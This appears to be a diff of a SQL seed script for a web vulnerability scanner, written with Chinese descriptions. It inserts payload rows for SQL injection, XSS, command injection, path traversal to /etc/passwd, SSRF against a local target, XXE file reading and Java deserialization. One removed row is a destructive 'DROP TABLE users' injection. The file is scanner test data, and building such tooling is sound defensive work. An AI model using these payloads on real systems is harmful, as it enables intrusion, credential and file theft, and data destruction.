+('SQL_INJECTION', 'BASIC', '1 AND 1=1', 'AND', '布尔型恒真注入探测', 'MEDIUM', 1),
 ('SQL_INJECTION', 'ADVANCED', '1; SELECT 1', 'statement_results', '堆叠语句执行探测', 'HIGH', 1),
 ('SQL_INJECTION', 'ADVANCED', '1 UNION SELECT 1,2,3,4,5', 'UNION', '联合查询注入探测', 'HIGH', 1),
 ('SQL_INJECTION', 'ADVANCED', '1'' AND ''1''=''1', 'AND', '字符串型注入探测', 'MEDIUM', 1),
-('SQL_INJECTION', 'ADVANCED', '1; DROP TABLE users--', 'DROP', '危险操作注入探测', 'CRITICAL', 1),
 ('SQL_INJECTION', 'ADVANCED', '1 AND SLEEP(3)', 'SLEEP', '时间盲注探测', 'MEDIUM', 1),
 
 -- XSS Payload
-('XSS', 'BASIC', '<svg/onload=alert(''scan_xss_quick'')>', 'scan_xss_quick', 'SVG 事件回显探测', 'MEDIUM', 1),
-('XSS', 'ADVANCED', '<img src=x onerror=alert(''scan_xss_full'')>', 'scan_xss_full', 'IMG onerror 回显探测', 'MEDIUM', 1),
-('XSS', 'ADVANCED', '<script>alert(''scan_xss_script'')</script>', 'scan_xss_script', 'Script 标签探测', 'HIGH', 1),
-('XSS', 'ADVANCED', '\'"><script>alert(''scan_xss_attr'')</script>', 'scan_xss_attr', '属性注入探测', 'HIGH', 1),
-('XSS', 'ADVANCED', '<body onload=alert(''scan_xss_body'')>', 'scan_xss_body', 'Body 事件探测', 'MEDIUM', 1),
-('XSS', 'ADVANCED', '<iframe src=''javascript:alert("scan_xss_iframe")''>', 'scan_xss_iframe', 'Iframe 注入探测', 'HIGH', 1),
+('XSS', 'BASIC', '<script>alert(1)</script>', 'script', 'Script标签探测', 'HIGH', 1),
+('XSS', 'BASIC', '<svg/onload=alert(1)>', 'svg', 'SVG事件回显探测', 'MEDIUM', 1),
+('XSS', 'ADVANCED', '<img src=x onerror=alert(1)>', 'img', 'IMG onerror回显探测', 'MEDIUM', 1),
+('XSS', 'ADVANCED', '\'""><script>alert(1)</script>', 'script', '属性注入探测', 'HIGH', 1),
+('XSS', 'ADVANCED', '<body onload=alert(1)>', 'body', 'Body事件探测', 'MEDIUM', 1),
+('XSS', 'ADVANCED', '<iframe src="javascript:alert(1)">', 'iframe', 'Iframe注入探测', 'HIGH', 1),
 
--- 命令注入Payload（Windows）
-('COMMAND_INJECTION', 'BASIC', 'ping 127.0.0.1 -n 2', 'Pinging,ping statistics', 'Ping 命令探测', 'HIGH', 1),
-('COMMAND_INJECTION', 'ADVANCED', 'whoami', '\\\\,root', '用户身份探测', 'HIGH', 1),
+-- 命令注入Payload
+('COMMAND_INJECTION', 'BASIC', 'ping 127.0.0.1 -n 2', 'Pinging,ping statistics', 'Ping命令探测', 'HIGH', 1),
+('COMMAND_INJECTION', 'BASIC', 'whoami', '\\\\,root', '用户身份探测', 'HIGH', 1),
 ('COMMAND_INJECTION', 'ADVANCED', 'dir', 'bytes,total', '目录列表探测', 'MEDIUM', 1),
-('COMMAND_INJECTION', 'ADVANCED', 'tasklist,ps aux', 'PID', '进程列表探测', 'MEDIUM', 1),
+('COMMAND_INJECTION', 'ADVANCED', 'tasklist', 'PID', '进程列表探测', 'MEDIUM', 1),
 
 -- 路径遍历Payload
 ('PATH_TRAVERSAL', 'BASIC', '../../application.yml', 'server:', '读取服务配置文件', 'HIGH', 1),
-('PATH_TRAVERSAL', 'ADVANCED', '../../../../../pom.xml', '<project', '读取项目构建文件', 'HIGH', 1),
-('PATH_TRAVERSAL', 'ADVANCED', '....//....//....//etc/passwd', 'root:', 'Linux 密码文件读取', 'CRITICAL', 1),
-('PATH_TRAVERSAL', 'ADVANCED', '..\\..\\..\\..\\windows\\win.ini', '[fonts]', 'Windows 系统文件读取', 'CRITICAL', 1);
+('PATH_TRAVERSAL', 'ADVANCED', '../../../pom.xml', '<project', '读取项目构建文件', 'HIGH', 1),
+('PATH_TRAVERSAL', 'ADVANCED', '....//....//etc/passwd', 'root:', 'Linux密码文件读取', 'CRITICAL', 1),
+
+-- 文件包含Payload
+('FILE_INCLUSION', 'BASIC', 'test.txt', 'content', '基础文件包含测试', 'LOW', 1),
+('FILE_INCLUSION', 'ADVANCED', 'classpath:application.yml', 'server:', 'Classpath文件包含', 'HIGH', 1),
+
+-- SSRF Payload
+('SSRF', 'BASIC', 'http://127.0.0.1:9001/target/ddos/status', 'DDoS', '本地回环SSRF探测', 'HIGH', 1),
+('SSRF', 'ADVANCED', 'http://localhost:9001/target/sql/query?id=1', 'SQL', '本地服务SSRF探测', 'HIGH', 1),
+
+-- XXE Payload
+('XXE', 'BASIC', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'root:', 'XXE文件读取探测', 'HIGH', 1),
+
+-- 反序列化Payload
+('DESERIALIZATION', 'BASIC', 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4', 'HashMap', 'Java序列化对象探测', 'HIGH', 1);
 
 -- ------------------------------------------------------------
 -- 4.4 初始化系统配置
